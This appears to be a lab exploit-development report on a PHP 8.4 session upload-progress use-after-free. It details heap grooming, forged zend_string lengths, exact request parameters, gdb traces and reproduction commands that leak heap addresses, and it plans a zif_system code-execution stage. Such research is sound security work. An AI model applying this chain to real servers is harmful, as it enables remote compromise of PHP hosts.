# Pure HTTP chain that does not depend on `display_errors`: progress and remaining calibration

Date: 2026-10-21
Target: PHP 8.4.26 + Apache 2.4.68 prefork + mod_php (`172.16.0.103`,
`display_errors=0`, `memory_limit=8M`, single worker)
Constraints: fully remote, only plain multipart HTTP; the target page is
`<?php echo "agtt-lab :: target online\n"; ?>` (no `session_start()`); do not read the target's `/proc`.

---

## 1. Conclusion (current state)

The **OOM-in-cookie primitive that does not depend on warning output** has now been made to work under `display_errors=0`:

1. Request A OOMs inside `php_session_send_cookie()`, at the first
   `zend_string_safe_alloc(3, 32, 0, 0)` of `php_url_encode()` (121B → bin 128);
2. The OOM happens after `PS(send_cookie)=1` and before `PS(send_cookie)=0`;
   the request bails out, leaving `PS(id)` (32-char random id) and `PS(send_cookie)=1` in place;
3. No PHP warning/output participates at all; `SG(headers_sent)` stays 0;
4. The subsequent B request's pre-RINIT `MULTIPART_EVENT_END → php_session_rfc1867_cleanup()
   → php_session_initialize()` can now pass through the `PS(mod_data)` cleanup left over from A,
   calling `php_session_send_cookie()` with a **dangling `PS(id)`** (the `RESET_ID`/`SEND_COOKIE`
   breakpoints have been observed to hit, `send_cookie=1`).

The remaining step was for B-side to reclaim the dangling id block as a forged `zend_string` header (making `url_encode`
read a controlled large length), while ensuring that `php_rshutdown_session_globals()` releasing that id no longer triggers `zend_mm_panic`. **This step is also done**: B uses two large fields to spread the cached id
chunk up to page 510, so that the surviving copy of the second field lands exactly on pages 257–511, and writes the forged header + trailing uninitialized region at the
corresponding offset in page 511; `url_encode` reads out 4000 bytes,
of which the last 3000 bytes are the bin-64 freelist pointers A left behind in the tail of page 511.

Measured results (`display_errors=0`):

```text
Set-Cookie: PHPSESSID=MMMM... (1000 bytes of M, followed by 4000 bytes of decoded result)
decoded=4000 ptrs=47 chunk_base=0x7ffff3e00000     # no-ASLR
decoded=4000 ptrs=47 chunk_base=0x7f9acd000000     # ASLR-on
decoded=4000 ptrs=47 chunk_base=0x7f1416e00000     # ASLR-on
```

no-ASLR 3/3, ASLR-on 2/2 (all under a configuration that confirms `display_errors 0`); failed samples simply missed page 511 (returning a normal
32-byte cookie) and do not crash.

### 1.1 The target page does not need `session_start`

The target page used in this round of testing was:

```php
<?php
// Lab target endpoint
echo "agtt-lab :: target online\n";
?>
```

There is no `session_start()`. The whole chain still holds, because session initialization happens in the `session.upload_progress` callback
before RINIT:

- A: `MULTIPART_EVENT_FILE_START → php_session_rfc1867_update →
  php_session_initialize()`;
- B: `MULTIPART_EVENT_END → php_session_rfc1867_cleanup →
  php_session_initialize()`.

Both occur before script execution, so whether the page calls `session_start()` is irrelevant to the vulnerability chain.
Measured results (the same session-less page):

- The forge leak with `display_errors=0`: 4000 bytes / 47 pointers, chunk base
  `0x7ffff3e00000` (evidence `logs/nosession_forge_20261021.resp`);
- The old `display_errors=1` stage-1 leak: 4096 bytes / 98 pointers, chunk base
  `0x7ffff5e00000` (evidence `logs/nosession_classic_leak_20261021.resp`).


---

## 2. Why the old chain depended on `display_errors`

The old A used the `max_input_vars` warning to set `SG(headers_sent)` to 1, making
`php_session_send_cookie()` return `FAILURE`:

```c
if (SG(headers_sent)) { ... return FAILURE; }   /* send_cookie still 1 */
```

`php_session_reset_id()` returns `FAILURE` → `php_session_initialize()` calls
`php_session_abort()` → `ps_close_files()` normally frees `PS(mod_data)` (sets it to NULL).
So B's `s_open` sees `mod_data == NULL` and never touches the dangling pointer;
B only needs to reclaim the dangling id block with the raw buffer.

With `display_errors=0` the warning produces no output, `headers_sent` is never set, and this "FAILURE +
abort" path disappears. The only option is to make the OOM happen directly inside `send_cookie`:

- `send_cookie` never returns, so `PS(send_cookie)=1` is preserved;
- but `php_session_abort()` never executes either, so `PS(mod_data)` becomes a dangling pointer;
- B's `s_open` will first call `ps_close_files(dangling mod_data)` — this is the new problem.

---

## 3. A: allocation facts of the OOM-in-cookie

First allocation of `php_session_send_cookie()` (8.4.26):

```c
e_id = php_url_encode(ZSTR_VAL(PS(id)), ZSTR_LEN(PS(id)));
```

`php_url_encode_impl()`:

```c
start = zend_string_safe_alloc(3, len, 0, 0);   // len = 32
```

Request size = `24 + 3*32 + 1 = 121` → **bin 128** (1-page run, 32 slots).
As long as these hold simultaneously at the `send_cookie` entry:

- `heap->free_slot[11] == NULL` (bin 128 empty)
- the sum of `free_pages` across the four chunks is 0

this allocation goes through `zend_mm_alloc_small_slow(heap, 11)` →
`zend_mm_alloc_pages(1)` → no free page → `zend_mm_safe_error` → bailout.

### 3.1 Request shape

`tools/send_a_oom5.py`, empirically stable parameters:

```text
F=0  S=62  NB=235  BL=15000  X=208  K=0  KL=4000  FL=103
```

- **S=62 single-name fields**: name is 103B (zend_string = 128 → bin 128), value is 8B.
  Each field's filter value copy is bin 40; the name contributes 1 live bin-128 block.
  The file part (field name 103B + filename 103B) contributes 2 more live bin-128 blocks.
  Total `62 + 2 = 64 = 2×32` → `free_slot[11]` empty exactly.
  (Note: a field with a 103B value contributes 3 live bin-128 blocks, so an 8B value must be used here.)
- **NB×BL = 235 × 15000B**: big fields fill memory; each value has 2 live copies
  (`IF_G(post_array)` + `$_POST`), each `25+15000` → 4 pages, 8 pages per field in total.
- **X=208 values of 231B**: bin 256 (16 slots/page); each field has 2 live slots + 1 transient
  raw slot; every 8 fields triggers a new 256B run (1 page), used for 1-page-granularity finishing.

### 3.2 gdb evidence

`logs/oomcookie_A_20261021.log`:

```text
SEND_COOKIE id=0x7ffff3fff000 len=32 size=8253840 real=8388608 limit=8388608
            free_pages=0 chunks=[0,0,0,0] fs7=.../63 fs9=0/0 fs11=0x0/0
MM_SAFE_ERROR real=8388608 limit=8388608 size=8253968
PS_AT_OOM id=0x7ffff3fff000 len=32 send_cookie=1
#3 zend_string_safe_alloc (persistent=false, l=0, m=32, n=3)
#4 php_url_encode_impl (raw=false, len=32, s=0x7ffff3fff018 "...")
#5 php_url_encode
#6 php_session_send_cookie
#7 php_session_reset_id
#8 php_session_initialize
#9 php_session_rfc1867_update
```

Key points:

- `real=8M=limit`: all 4 chunks mapped, no more mmap possible;
- `free_pages=0`, `fs11=0`: the bin-128 run of `url_encode` has nowhere to be placed;
- the OOM lands precisely in `php_url_encode_impl`, not in the parsing/big-field stage;
- `PS_AT_OOM send_cookie=1`: `PS(send_cookie)` was not cleared to 0, and `PS(id)` still points to
  the 32-char random id (`id=0x7ffff3fff000`, at page 511 of chunk `0x7ffff3e00000`).

A's response is `500 Internal Server Error` with an empty body (no output under display_errors=0),
and the worker survives.

### 3.3 Calibration method

`tools/trial_bins.sh` restarts Apache each time (`setarch -R`), attaches gdb, sends A,
and prints `SEND_COOKIE` / `MM_SAFE_ERROR`. Adjusting X (±1) can move
`free_pages` between 0 and nonzero; `fs11` is determined only by S (S ≡ 30 mod 32).
At the current S=62, X=206..212 all hit `free_pages=0, fs11=0`.

---

## 4. B: passing through the dangling `PS(mod_data)`

### 4.1 Crash mechanism

B's `MULTIPART_EVENT_END → php_session_rfc1867_cleanup() →
php_session_initialize()`:

```c
PS(mod)->s_open(&PS(mod_data), ...)          /* ps_open_files */
    data = ecalloc(1, sizeof(ps_files));     /* 40B -> bin 40 */
    data->basedir = zend_string_init("/tmp");
    if (PS_GET_MOD_DATA()) ps_close_files(mod_data);   /* <- dangling pointer */
    PS_SET_MOD_DATA(data);
```

A's `PS(mod_data)` is a `ps_files*` (`ecalloc(1,40)`); the measured address is
`0x7ffff5e7f500` (main chunk + `0x7f500`, bin-40 slot 32). A's shutdown
never ran session RSHUTDOWN, so this pointer dangles.

If that address in B is not a valid block, `efree(data)` inside `ps_close_files()` triggers
`zend_mm_panic("zend_mm_heap corrupted")` (the `chunk->heap` check).

### 4.2 Solution: make that page an arbitrary SRUN page in B

`zend_mm_free_heap()` performs **no block alignment check** for SRUN pages; it only checks
`chunk->heap == heap`, and then `zend_mm_free_small(heap, ptr, bin)` puts it straight
onto the freelist. So as long as B turns the page containing `0x7ffff5e7f500` (main chunk page 127)
into a run page of a small bin, `efree(data)` does not panic.

Measured B shape:

```text
N=160 fields with values of 231B (bin 256)
```

At B's `ps_open_files` breakpoint:

```text
new=0x7ffff5e64028 pg=100 info=0x80000004
old=0x7ffff5e7f500 pg=127 chunk_heap=0x7ffff5e00040 match=1 info=0x8000000f
last_key=0x7ffff5e7f600 basedir=0x7ffff5e022c0 fd=-1
```

- page 127 is SRUN bin 15 (256B), slot 5 unallocated (that run still has 12 free slots);
- `last_key` is the next free slot pointer of the same run (safe);
- `basedir` is still A's `/tmp` zend_string pointer (safe, bin-32 page SRUN);
- `fd=-1`.

`ps_close_files` therefore returns, and `s_open` sets up a brand-new valid `mod_data`;
initialize sees the first byte of the dangling id is nonzero (A's random id is still intact), skips create-id,
and calls `php_session_reset_id()` directly:

```text
RESET_ID id=0x7ffff3fff000 len=32 send_cookie=1
SEND_COOKIE id=0x7ffff3fff000 len=32 ... free_pages=370 ...
```

**B has now called `php_session_send_cookie()` with the dangling id** (because A's id is still there,
and `send_cookie=1` is still set). This step replaces the `display_errors` dependency of the old chain.

### 4.3 Remaining crash: rshutdown frees the dangling id

`MULTIPART_EVENT_END` runs unconditionally after the cleanup:

```c
php_rshutdown_session_globals();
    ...
    if (PS(id)) { zend_string_release_ex(PS(id), 0); PS(id) = NULL; }
```

The dangling id lies at page 511 of chunk `0x7ffff3e00000` (page start, address
`0x7ffff3fff000`). In B that chunk is only a **cached chunk**:

```text
RSHUT_ID id=0x7ffff3fff000 base=0x7ffff3e00000 pg=511
          chunk_heap=0x0 match=0 info=0x0
          bytes=01000000160000000000000000000000   # refcount=1
```

`chunk_heap=0` → `zend_mm_free_heap`'s `chunk->heap == heap` check fails →
panic. A's id zend_string still has `refcount=1`, so the release attempts efree.

---

## 5. B's forge (implemented)

### 5.1 Goal

Make B reclaim the dangling id block with controlled content before `send_cookie`
(`0x7ffff3e00000 + 0x1ff000`, i.e. page 511 slot 0 of that chunk) so that:

- `PS(id)+0x10` (len) = 4000;
- `PS(id)+0x00` is not refcount=1 at rshutdown (after free it is the freelist next);
- `url_encode` reads 4000 bytes from `PS(id)+0x18`, the first 1000 bytes being padding, the last 3000
  bytes being the bin-64 freelist pointers A left behind in the tail of page 511;
- `url_encode`'s `3*len` allocation (12000B → 3 pages) succeeds in B.

### 5.2 Two-field page spreading

B's body order (`send_b_open.py`):

```text
160 × 231B values (bin-256 run, turning main chunk page 127 into a partial run with 12 free slots)
1 × 1,048,551B value (BB1, zend_string = 256 pages)
1 × 1,041,384B value (BF, zend_string = 255 pages, forge payload)
PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS
(no file part, goes through pre-RINIT END cleanup)
```

Allocation sequence (measured):

1. BB1's raw (256 pages) first lands in the main chunk's free tail, and is then freed;
2. One of BB1's two surviving copies takes the cached id chunk out (`chunk_init`),
   landing on pages 1–256;
3. BF's raw (255 pages) reuses the main chunk's free tail, and is then freed;
4. BF's surviving copy lands on pages 257–511 of the id chunk (because 257–511 is exactly 255 pages,
   Best-Fit exact match), covering page 511.

Thus `PS(id)` (page 511) falls inside the **data region of a surviving zend_string**,
and the data is not overwritten by later allocations.

### 5.3 Forged header layout

BF's allocation starts at `S = chunk + 257*4096`; page 511 is at `S + 254*4096`.
The zend_string data starts at `S+0x18`, so the forged header's offset inside the value is:

```text
D = (510 - 256) * 4096 = 254 * 4096 = 1,040,384
gc    at D-24 : 0x4141414141414141   (refcount != 1 at rshutdown)
h     at D-16 : 0
len   at D-8  : 4000
data  at D    : 'M' * 1000, then the value ends (L2 = D+1000)
```

BF's allocation size is `25 + L2 = 1,041,409` → 255 pages (exactly aligned with pages 257–511).
The value data only writes 1000 bytes inside page 511; the following ~3000 bytes is an uninitialized region
that preserves the bin-64 freelist pointers from A's era at the tail of page 511.

### 5.4 Measured results

`SEND_COOKIE id=0x7ffff3fff000 len=4000`; `RSHUT_ID ... bytes=41414141...`
(match=1, no more panic); the response is `200 OK`, and after decoding the `Set-Cookie` is 4000 bytes:

```text
logs/oomcookie_leak_noaslr_20261021.resp:
  decoded=4000 ptrs=47 chunk_base=0x7ffff3e00000

logs/oomcookie_leak_aslr_20261021.resp:
  decoded=4000 ptrs=47 chunk_base=0x7f9acd000000
  (another ASLR round: 0x7f1416e00000)
```

All 47 pointers are intra-chunk addresses (e.g. `0x7ffff3fff400/…f480/…f4c0`);
taking the 2MB-aligned mode yields the chunk base.

### 5.5 Reproduction

```bash
# no-ASLR
BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
  ./trial_ab.sh 0 62 235 15000 208 0 4000 103

# ASLR-on
ASLR_ON=1 BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
  ./trial_ab.sh 0 62 235 15000 208 0 4000 103
```

### 5.6 Stability

- no-ASLR 3/3; ASLR-on 2/2 (both under display_errors=0);
- failed samples: page 511 not covered, `len` still 32, returning a normal 32-byte cookie,
  no crash; just retry;
- relies on `trial_ab.sh`'s fresh-worker + gdb attach check (retry while breakpoints are pending).

### 5.7 Verified checklist

- [x] Under `display_errors=0`, A OOMs in `php_url_encode` with `send_cookie=1`
- [x] A's `PS(id)` dangles and survives across requests
- [x] B's `ps_close_files(dangling mod_data)` does not panic (SRUN page + free slot alignment)
- [x] B calls `send_cookie` with the dangling id (`RESET_ID`/`SEND_COOKIE` hit)
- [x] B takes the cached chunk (`chunk_heap != 0`); rshutdown no longer panics
- [x] Two-field page spreading + BF copy covering page 511, forged len=4000
- [x] `Set-Cookie` contains 47 intra-chunk pointers; chunk base recoverable (incl. ASLR)

## 6. Remaining engineering (stage-2/3)

### 6.1 Precise constraints of stage-2 (display_errors=0)

Stage-2 targets reading a real HashTable:

```text
PS(id)+0x10 = HT+0x20 = nTableSize | nInternalPointer   -> len
PS(id)+0x18 = HT+0x28 = nNextFreeElement                -> 1st qword of data
PS(id)+0x20 = HT+0x30 = pDestructor (libphp+0x613c50)    -> 2nd qword of data
```

Therefore either `PS(id) = HT+0x10`, or use the page-511 forge to enlarge len,
so the read window covers the real HashTable that follows.

In the current 0 chain, `PS(id)` is the **last page** of the cached id chunk (page 511,
`chunk+0x1ff000`). The read window runs from `PS(id)+0x18` to the page end, at most about 0xF E8 bytes,
and **cannot leave this chunk** (subsequent addresses are unmapped). So:

1. the real HashTable must land within page 511;
2. page 511 can only host a **run of one bin**: either bin-56 (HashTable
   structs, 56B) or the large object carrying the forge — the two cannot coexist;
3. if page 511 hosts a bin-56 run: slot 0 holds a freed 55B raw buffer
   (+0x10 = forged len, +0x18 = data), slot 1 holds the real HashTable
   (pDestructor at page+0x68), and the read window exactly covers it;
4. but this 1-page run only lands on page 511 of the id chunk when the **main chunk has no free pages**;
   currently B's main chunk still has 370 free pages, so a 1-page run lands
   in the main chunk first.

### 6.2 Experiments already done

- **Late big field**: inserting a 50/100-page field before the X trimmer, its raw buffer
  freed to try to leave a hole in the main chunk. Measured: with NB=235 it OOMs directly; with NB=215/208 it reaches
  `send_cookie`, but the id is still in the 0x3e/0x3d chunk, and `url_encode` also did not land
  at the OOM point (free_pages > 0). The reason is the 2 surviving copies of the raw topped out the steady-state memory,
  and the pages freed by the raw were insufficient to become the sole last page.
- **arData 513th expansion**: pushing the 513th insert to the tail of X OOMs (needs
  10 pages of contiguous space); pushing it to the middle of the bigs instead lets the old arData's 4-page hole
  be exactly consumed by a subsequent big's 4-page copy.
- **Conclusion**: to finish stage-2, an explicit three-stage heap grooming of "fill the main chunk
  with surviving copies + keep page 511 of the id chunk free + drop a bin-56 run onto 511" is required; that is the next
  calibration work, not something a single parameter can solve.

### 6.3 New primitive (evening of 2026-10-21): stale id shifted into the interior of a live string

The 5.x path above kept `PS(id)` on page 511 of the cached chunk; this round switched to a
path **inside the main chunk that does not rely on the page-511 forge**, and has empirically produced a 16KB out-of-bounds read:

1. On top of A's `WARM_LEN=60`, add one field with a 32-byte value (`W64_LEN=32`,
   stored zend_string = 24+32+1 = 57 → bin-64). It first claims slot 0 of
   the bin-64 run on page 128, and the 32-byte id of `php_session_create_id` lands in
   **slot 1**: `PS(id) = chunk + 0x80080` (page 128 + 0x80).
2. B still uses N=160 fields with 231B values; page 128 is a bin-256 run whose slot 0 is a
   **live** 231B string. `PS(id)=page+0x80` lands exactly in that string's
   data region:
   - the id's len field is at `PS(id)+0x10 = page+0x90 = value[0x78]`;
   - the id's data starts at `PS(id)+0x18 = page+0x98 = value[0x80]`.
   Writing `0x4000` at offset 0x78 of **every** value string, and a nonzero byte (`V`) at offset 0x80,
   makes B's `send_cookie` URL-encode per 0x4000;
   the header check (`ZSTR_VAL(id)[0] != 0`) also passes, because that byte is our `V`.
3. No longer need the free-list/forge to land on the stale block, and no longer need the cached chunk.

Measured parameters and results (no-ASLR, display_errors=0):

```bash
# A: WARM=60 makes the id main-chunk resident; W64=32 pushes the id from page+0x00 to page+0x80
WARM_LEN=60 W64_LEN=32 ./trial_bins.sh 0 62 235 15000 204 0 4000 103
#   SESSION_INIT/RESET_ID/SEND_COOKIE id=0x7ffff5e80080 len=32
#   MM_SAFE_ERROR still in php_url_encode; PS_AT_OOM send_cookie=1

# B: N=160 values of 231B, forging len=0x4000 at value offset 0x78
WARM_LEN=60 W64_LEN=32 BN=160 BVL=231 BVAL_OFF=0x78 BVAL_LEN=0x4000 \
  ./trial_ab.sh 0 62 235 15000 204 0 4000 103
#   SESSION_INIT id=0x7ffff5e80080 len=16384 send_cookie=1
#   SEND_COOKIE  id=0x7ffff5e80080 len=16384
#   Set-Cookie PHPSESSID=... (20616 chars, decodes to 16392 bytes)
```

Response archived: `logs/oomcookie_shift_leak_20261021.resp`. The decoded 16KB is
the bin-256 string slots starting at page 128 (each `gc=0x…0001, h=0, len=0xe7,
data='V'*231`), i.e. a **controlled-length, cross-slot/cross-chunk heap read** is now established; the window contents are currently
all the field strings themselves, with no libphp code pointer yet.

### 6.4 Two open constraints for stage-2 under the new primitive

To turn the 16KB window into a libphp leak, the window must contain a **real HashTable struct**
(`pDestructor = libphp+0x613c50` at `HT+0x30`). The alignment is:

```text
PS(id) = HT + 0x10
  id+0x10 = HT+0x20 = nTableSize | nInternalPointer   -> len
  id+0x18 = HT+0x28 = nNextFreeElement                -> data[0]
  id+0x20 = HT+0x30 = pDestructor                     -> data[8]
```

Currently A's `PS(id)=page128+0x80` exactly equals bin-56 run's **slot 2 + 0x10**
(bin-56 slot stride 0x38, slot2=0x70), so as long as B's bin-56 run lands on
page 128 and slot 2 is an array HashTable with `nTableSize>=16`, `pDestructor` leaks directly.
Two measured sticking points:

1. **bin-56 free-list starting point**: at B's `SESSION_INIT`, the bin-6
   (56B) free chain length is **64** (an entire empty page, from A's request
   shutdown). Those 64 slots must be consumed first; the 65th HashTable creates a new run;
   but the array fields' key/value strings (bin-32/40/48) create their own
   runs before that, stealing page 128 (measured: page 128 became bin-3/bin-4, and the id read
   garbage/len=1).
2. **Stale `ps_files` on page 127**: in display_errors=0, A OOMs inside
   `php_url_encode`, `php_session_abort()` never gets run, and `PS(mod_data)`
   is still the dangling ps_files (page 127 + 0x500). B's END cleanup does
   `ps_close_files` first, then `send_cookie`. Page 127 must be reallocated by B as an
   **SRUN page of a suitable bin**, and the `+0x500` slot must not be a live string (otherwise
   `last_key/basedir` reads a zend_string header and `zend_string_release` crashes).
   The 5.x N=160 shape happen to make page 127 bin-256 with slot 5 free;
   after adding array/tail fields, page 127 becomes free/bin-32/bin-40, triggering
   `zend_mm_panic` or SIGSEGV. A field sequence satisfying both
   "page 127 slot5 safe + page 128 bin-56 run slot2 HashTable" has not yet been found.

These two are pure calibration problems of stage-2; the stage-3 `zif_system` terminator
(`pDestructor=zif_system`, fake execute_data) can reuse `send_b_zif.py` directly once stage-2
yields the libphp base; only the fake HT/fake-ref addresses need recalibration to the new shape.

### 6.5 stage-3

The `zif_system` terminator (`pDestructor=zif_system`, fake execute_data) does not depend on
libc; once stage-2 gives the libphp base, `send_b_zif.py`'s
payload can be reused directly, needing only recalibration of the fake HT address and the fake-ref landing point according to the 0 chain's A/B shapes.


## 7. Files and commands

| File | Purpose |
|---|---|
| `tools/send_a_oom5.py` | A: S fields of 103B names/8B values + NB big fields + X values of 231B + file part; optional `AQ_N/AQ_LEN` GET padding, `WARM_LEN`, `W64_LEN` (bin-64 shift) |
| `tools/send_b_open.py` | B: N values of 231B + PHPSESSID + PROGRESS, no file part; `BB1_LEN` page spreading, `BF_P1/BF_READ` forge, `BVAL_OFF/BVAL_LEN` in-value forged len, `BUNIQ/DUP_*` unique values/same-name fields, `NEST_*` nested arrays, `TAIL231/232` tail fields; optional Cookie/Header/GET padding |
| `tools/trial_bins.sh` | A-only calibration (restart + gdb + send A) |
| `tools/trial_ab.sh` | fresh worker + send A/B after gdb breakpoints resolve; with `ASLR_ON=1` it does not use `setarch -R` |
| `tools/g_bins.gdb` | gdb probes: `SEND_COOKIE`, `OPEN_FILES`, `RESET_ID`, `RSHUT_ID`, `MM_SAFE_ERROR`, chunk/page map, cached chunks, bin15 free-slot stats |
| `logs/oomcookie_A_20261021.log` | A's gdb evidence (exact OOM landing point) |
| `logs/oomcookie_AB_20261021.log` | A+B evidence (passing through mod_data, B's send_cookie, old shape's rshutdown panic) |
| `logs/oomcookie_forge_aslr_20261021.gdb.log` | gdb trace of a successful forge (len=4000, RSHUT bytes=4141…) |
| `logs/oomcookie_leak_noaslr_20261021.resp` | no-ASLR leak response (decoded 4000, 47 ptrs, base 0x7ffff3e00000) |
| `logs/oomcookie_leak_aslr_20261021.resp` | ASLR leak response (base 0x7f9acd000000) |
| `logs/oomcookie_leak_decode_20261021.txt` | decoded-result summary |
| `logs/oomcookie_shift_leak_20261021.resp` | 16KB leak response of the shifted-id primitive (len=16384, 20616 chars) |

Reproduction (on the target machine, `~/php2shell-work`):

```bash
# A-only: confirm OOM-in-cookie
./trial_bins.sh 0 62 235 15000 208 0 4000 103

# A + B (passing through mod_data, page 511 not yet covered)
BN=160 BVL=231 ./trial_ab.sh 0 62 235 15000 208 0 4000 103

# A + B forge (chunk leak)
BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
  ./trial_ab.sh 0 62 235 15000 208 0 4000 103

# ASLR-on
ASLR_ON=1 BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
  ./trial_ab.sh 0 62 235 15000 208 0 4000 103
```

The key gdb output should include:

```text
SEND_COOKIE id=0x... len=32 free_pages=0 fs11=0x0/0
MM_SAFE_ERROR ... zend_string_safe_alloc(l=0, m=32, n=3) <- php_url_encode
PS_AT_OOM ... send_cookie=1
SESSION_INIT (B) id=0x7ffff3fff000 len=32 send_cookie=1
OPEN_FILES old=... info=0x8000000f last_key=... basedir=... fd=-1
RESET_ID id=0x7ffff3fff000 send_cookie=1
SEND_COOKIE (B) id=0x7ffff3fff000 len=4000
RSHUT_ID ... bytes=4141414141414141... match=1
```

---

## 8. Disclaimer

For vulnerability research and reproduction in authorized environments only. The request shapes, bin sequences and offsets are bound to this lab's
PHP 8.4.26 build, 8M memory_limit, files save handler and single-worker prefork;
switching builds/configuration requires recalibration.
